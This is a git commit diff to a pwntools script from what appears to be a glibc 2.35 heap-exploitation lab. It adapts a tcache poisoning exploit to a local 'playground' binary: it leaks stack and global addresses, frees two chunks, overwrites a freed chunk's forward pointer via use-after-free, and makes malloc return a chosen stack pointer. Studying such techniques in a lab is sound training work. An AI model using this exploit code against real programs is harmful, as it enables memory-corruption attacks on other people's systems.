9fb15b9c37b717d9cf2a0790da2705a59ac99df0
joaquin <jpinilloslr@gmail.com>
2026-09-12 20:06:45 +0200

    add tcache poisoning based on new playground

--- glibc_2.35/src/scripts/tcache_poisoning.py
+++ glibc_2.35/src/scripts/tcache_poisoning.py
@@ -3,7 +3,7 @@
 import pwn
 import sys
 
-BIN_FILENAME = "/lab/bin/interactive_heap"
+BIN_FILENAME = "/lab/bin/playground"
 
 gdbscript = """
     set resolve-heap-via-heuristic force
@@ -18,36 +18,52 @@ def protect_ptr(heap_addr, ptr):
 
 
 def exploit(p):
-    # get the first allocation
-    p.sendline(b"malloc 0 100")
+    # get leaks
+    p.recvuntil(b"[*] stack ")
+    stack_ptr = int(p.recvline()[:-1], 16)
+    print(f"stack_ptr: {stack_ptr:#x}")
+    p.recvuntil(b"[*] global ")
+    data_ptr = int(p.recvline()[:-1], 16)
+    print(f"data_ptr: {data_ptr:#x}")
+
+    # first allocation
+    p.clean()
+    p.sendline(b"malloc 0x64")
+    p.recvuntil(b"[*]")
+    ptr1 = int(p.recvline()[:-1], 16)
+    print(f"ptr1: {ptr1:#x}")
+
     # second allocation in same tcache bin
-    p.sendline(b"malloc 1 100")
+    p.clean()
+    p.sendline(b"malloc 0x64")
+    p.recvuntil(b"[*]")
+    ptr2 = int(p.recvline()[:-1], 16)
+    print(f"ptr2: {ptr2:#x}")
 
     # get the heap page where we're going to
     # write the fake fd pointer
-    p.recvuntil(b"allocations[0] = malloc(100)")
-    p.recvuntil(b"allocations[0] = ")
-    heap_addr = int(p.recvline()[:-1], 16)
-    heap_page = heap_addr & ~0xfff
+    heap_page = ptr1 & ~0xfff
     print(f"heap page: {heap_page:#x}")
 
-    p.sendline(b"free 1")
-    p.sendline(b"free 0")
+    p.sendline(f"free {ptr2:#x}".encode())
+    p.sendline(f"free {ptr1:#x}".encode())
 
-    # at this point tcache bin 0x70: alloc0 -> alloc1
+    # at this point tcache bin 0x70: ptr1 -> ptr2
     # let's perform UAF from alloc 0 to overwrite fd and
-    p.sendline(
-        b"scanf 0 8 " + 
-        pwn.p64(protect_ptr(heap_page, target))
-    )
-    # now tcache bin 0x70: alloc0 -> target
+    p.sendline(f"write {ptr1:#x} 8".encode())
+    p.sendline(pwn.p64(protect_ptr(heap_page, stack_ptr)))
+    # now tcache bin 0x70: ptr1 -> malicious_ptr
 
     # getting the first entry in tcache bin, we don't care
-    p.sendline("malloc 3 100")
-    # now tcache bin 0x70: target
+    p.sendline(b"malloc 0x64")
+    # now tcache bin 0x70: malicious_ptr
 
     # getting the forged next chunk, making malloc return an arbitrary pointer
-    p.sendline("malloc 3 100")
+    p.clean()
+    p.sendline(b"malloc 0x64")
+    p.recvuntil(b"[*]")
+    malicious_ptr = int(p.recvline()[:-1], 16)
+    print(f"malicious_ptr: {malicious_ptr:#x}")
 
 
 def main():
@@ -61,7 +77,7 @@ def main():
         p = pwn.process(BIN_FILENAME, env={})
 
     exploit(p)
-    p.interactive()
+    input("done")
 
 
 if __name__ == "__main__":
